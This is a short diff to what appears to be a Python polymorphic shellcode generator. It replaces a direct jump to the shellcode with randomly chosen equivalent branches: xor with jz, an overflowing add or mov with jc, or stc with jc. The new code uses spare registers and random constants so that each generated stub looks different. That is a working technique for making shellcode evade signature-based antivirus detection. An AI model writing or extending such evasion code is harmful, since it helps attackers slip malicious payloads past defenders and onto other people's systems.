@@ -149,7 +149,30 @@ else:
 	jmpBeforeOrders = random.randint(0, 3)
 	assembler += jmpPoly(jmpBeforeOrders)
 	# execute jmp
-	assembler += "\tjmp " + callShellcode + "\n"
+	tmpRnd = random.randint(0,2)
+	if tmpRnd != 0:
+		tmp = random.randint(0, len(unusedRegisters)-1)
+		jmpSubstituteRegister = unusedRegisters.pop(tmp)
+		if tmpRnd == 1:
+			assembler += "\txor " + jmpSubstituteRegister + ", " + jmpSubstituteRegister + "\n"
+			assembler += "\tjz " + callShellcode + "\n"
+		else:
+			tmpRndCarriage = random.randint(0, 1)
+			if tmpRndCarriage == 1:
+				overflowIntOne = random.randint(4294960000, 4294967000)
+				overflowIntTwo = random.randint(1111111111, 3333333333)
+				assembler += "\txor " + jmpSubstituteRegister + ", " + jmpSubstituteRegister + "\n"
+				tmpRnd2 = random.randint(0, 1)
+				if tmpRnd2 == 0:
+					assembler += "\tadd " + jmpSubstituteRegister + ", " + str(overflowIntOne) + "\n"
+				else:
+					assembler += "\tmov " + jmpSubstituteRegister + ", " + str(overflowIntOne) + "\n"
+				assembler += "\tadd " + jmpSubstituteRegister + ", " + str(overflowIntTwo) + "\n"
+			else:
+				assembler += "\tstc\n"
+			assembler += "\tjc " + callShellcode + "\n"
+	else:
+		assembler += "\tjmp " + callShellcode + "\n"
 	# poly after jmp
 	jmpAfterOrders = random.randint(0, 3)
 	assembler += jmpPoly(jmpAfterOrders)
